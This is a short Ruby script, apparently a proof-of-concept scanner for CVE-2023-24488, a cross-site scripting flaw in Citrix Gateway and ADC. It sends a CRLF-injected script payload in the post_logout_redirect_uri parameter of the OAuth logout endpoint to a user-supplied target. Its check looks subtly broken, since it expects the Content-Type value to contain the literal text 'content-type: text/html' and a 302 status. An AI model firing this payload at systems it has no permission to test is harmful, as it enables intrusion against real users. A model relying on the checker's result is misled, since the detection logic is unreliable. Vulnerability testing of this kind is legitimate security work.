# CVE-2023-24488.rb

require 'httparty'

print "Enter target URL: "
target_url = gets.chomp

def check_cve_2023_24488(url)
  path = "/oauth/idp/logout?post_logout_redirect_uri=%0d%0a%0d%0a<script>alert(document.domain)</script>"
  response = HTTParty.get(url + path)

  if response.body.include?("<script>alert(document.domain)</script>") &&
     response.headers['Content-Type'].to_s.downcase.include?("content-type: text/html") &&
     response.code == 302
    return true
  end

  return false
end

if check_cve_2023_24488(target_url)
  puts "Vulnerable to CVE-2023-24488: Citrix Gateway and Citrix ADC - Cross-Site Scripting"
else
  puts "Not vulnerable to CVE-2023-24488"
end
